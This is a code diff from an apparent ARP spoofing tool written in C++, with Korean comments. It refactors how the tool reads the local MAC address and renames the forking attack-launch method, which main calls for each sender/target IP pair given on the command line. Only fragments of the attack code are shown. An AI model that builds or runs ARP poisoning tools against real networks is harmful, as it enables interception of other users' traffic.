@@ -54,17 +54,23 @@ private:
 	pcap_t *handle;
 
 public:
-	pid_t activate();
+	std::string getMyMac();
+	pid_t asnycActivate();
 	ARP_Attaker(char *interface, char *sender_ip, char *target_ip);
 };
+
+std::string ARP_Attaker::getMyMac(){
+	std::string command = "cat /sys/class/net/";
+	command += "wlan0";
+	command += "/address";
+	std::string MyMAC = execute_command(command.c_str());
+	return MyMAC;
+}
 
 ARP_Attaker::ARP_Attaker(char *interface, char *sender_ip, char *target_ip)
 {
 
-	std::string command = "cat /sys/class/net/"; // 여기에 실행하고자 하는 명령어를 넣으세요.
-	command += "wlan0";
-	command += "/address";
-	std::string MyMAC = execute_command(command.c_str());
+	std::string MyMAC = getMyMac();
 
 	char *dev = interface;
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -90,7 +96,7 @@ ARP_Attaker::ARP_Attaker(char *interface, char *sender_ip, char *target_ip)
 	packet.arp_.tip_ = htonl(Ip(target_ip));	  // 192.168.35.211, 94:E2:3C:D6:CF:D1
 }
 
-pid_t ARP_Attaker::activate()
+pid_t ARP_Attaker::asnycActivate()
 {
 
 	pid_t pid = fork(); // fork() 호출
@@ -164,7 +170,7 @@ int main(int argc, char *argv[])
 	for (int i = 2; i < argc; i += 2)
 	{														 // attacking by using incorrect ARP Packet
 		ARP_Attaker attacker(argv[1], argv[i], argv[i + 1]); // init
-		pid_t pid = attacker.activate();					 // attack
+		pid_t pid = attacker.asnycActivate();					 // attack
 	}
 
 	return 1;
